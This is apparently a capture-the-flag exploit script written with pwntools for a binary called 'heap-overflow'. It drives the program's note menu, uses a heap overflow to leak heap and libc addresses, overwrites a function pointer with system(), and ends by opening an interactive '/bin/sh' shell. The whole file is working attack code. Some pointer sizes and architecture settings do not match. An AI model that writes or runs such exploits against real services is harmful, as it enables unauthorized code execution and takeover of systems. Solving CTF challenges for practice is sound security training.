from pwn import *
from PwnAssistor.attacker import *


context.update(arch='amd64', os='linux')
context.log_level = 'info'
exe_path = ('./heap-overflow')
exe = context.binary = ELF(exe_path)
libc = ELF('/lib/libc.so.6')

host = ''
port = 0
if sys.argv[1] == 'r':
    p = remote(host, port)
elif sys.argv[1] == 'p':
    p = process(exe_path)
else:
    p = gdb.debug(
        exe_path)


def gdb_pause(p):
    gdb.attach(p)
    pause()


def add_note(title, type, content):
    p.sendlineafter("-->>", "1")
    p.sendafter("title", title)
    p.sendafter("type", type)
    p.sendafter("content", content)


def show_title():
    p.sendlineafter("-->>", "2")


def show_note(title):
    p.sendlineafter("-->>", "3")
    p.sendafter("title", title)


def edit_note(title, content):
    p.sendlineafter("-->>", "4")
    p.sendafter("title", title)
    p.sendafter("content", content)


def delete_note(location):
    p.sendlineafter("-->>", "5")
    p.sendafter("location", location)


def pwn():

    add_note("1", "aaaa", "aaaa")
    add_note("2", "bbbb", "bbbb")
    add_note("3", "cccc", "cccc")
    add_note("4", "dddd", "dddd")
    
    show_note("2")

    p.recvuntil("location:")
    heap_base = int(p.recvuntil("320"), 16) - 0x1320
    log.success("heap_base: " + hex(heap_base))

    edit_note("1", b"a"*0x100+p32(0x804a440-0xc)*4)
    show_note(p64(0x804a34c))

    p.recvuntil("\xf7")
    p.recvuntil("\xf7")
    libc_base = u32(p.recvuntil("\xf7")[-4:]) - libc.sym['read']
    log.success("libc_base: " + hex(libc_base))
    
    
    edit_note("3",  b"a"*0x100+p32(0x804a408-0xc)*4)
    edit_note(p64(0x80483c4), p32(libc_base+libc.sym['system'])*0x10)

    p.sendline("5")
    p.sendline("/bin/sh\x00")
    
    p.interactive()


pwn()